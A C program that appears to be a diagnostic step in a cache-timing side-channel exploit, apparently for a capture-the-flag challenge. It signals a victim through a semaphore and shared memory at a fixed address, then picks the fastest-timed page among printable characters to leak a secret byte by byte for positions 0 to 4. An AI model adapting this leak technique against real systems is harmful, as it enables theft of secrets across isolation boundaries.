#include <stdio.h>
#include <stdint.h>
#include <semaphore.h>
#include <unistd.h>
#include <string.h>

#define SHARED_MEM_BASE 0x1337000
#define PAGE_SIZE 0x1000

int main() {
    sem_t *sem = (sem_t *)SHARED_MEM_BASE;
    int *index = (int *)(sem + 1);
    
    printf("Starting diagnostic...\n");
    printf("Semaphore at: %p\n", sem);
    printf("Index at: %p\n", index);
    
    // Try a single measurement for position 0
    *index = 0;
    printf("Set index to 0\n");
    
    sem_post(sem);
    printf("Posted semaphore\n");
    
    usleep(10000); // Wait longer
    
    // Check timing data in multiple ways
    printf("\nChecking timing data layout:\n");
    
    // Method 1: Original way (single page)
    uint64_t *timing_page = (uint64_t *)(SHARED_MEM_BASE + PAGE_SIZE);
    printf("First 10 values from single page (0x%lx):\n", (unsigned long)timing_page);
    for (int i = 0; i < 10; i++) {
        printf("  [%d]: %lu\n", i, timing_page[i]);
    }
    
    // Method 2: Multiple pages (new way)
    printf("\nFirst 10 values from multiple pages:\n");
    for (int i = 0; i < 10; i++) {
        uint64_t *page = (uint64_t *)(SHARED_MEM_BASE + PAGE_SIZE + PAGE_SIZE * i);
        printf("  Page %d (0x%lx): %lu\n", i, (unsigned long)page, *page);
    }
    
    // Method 3: Check for printable characters specifically
    printf("\nChecking printable character ranges:\n");
    uint64_t min_time = UINT64_MAX;
    int best_char = 0;
    
    for (int i = 0x20; i <= 0x7e; i++) { // printable ASCII
        uint64_t *page = (uint64_t *)(SHARED_MEM_BASE + PAGE_SIZE + PAGE_SIZE * i);
        uint64_t time = *page;
        printf("  '%c' (%d): %lu\n", i, i, time);
        if (time < min_time) {
            min_time = time;
            best_char = i;
        }
    }
    
    printf("\nBest candidate: '%c' (%d) with time %lu\n", best_char, best_char, min_time);
    
    // Try a few more positions
    printf("\nTrying positions 1-4:\n");
    for (int pos = 1; pos <= 4; pos++) {
        *index = pos;
        sem_post(sem);
        usleep(10000);
        
        uint64_t min_time = UINT64_MAX;
        int best_char = 0;
        
        for (int i = 0x20; i <= 0x7e; i++) {
            uint64_t *page = (uint64_t *)(SHARED_MEM_BASE + PAGE_SIZE + PAGE_SIZE * i);
            uint64_t time = *page;
            if (time < min_time) {
                min_time = time;
                best_char = i;
            }
        }
        
        printf("  Position %d: '%c' (%d) time %lu\n", pos, best_char, best_char, min_time);
    }
    
    return 0;
}
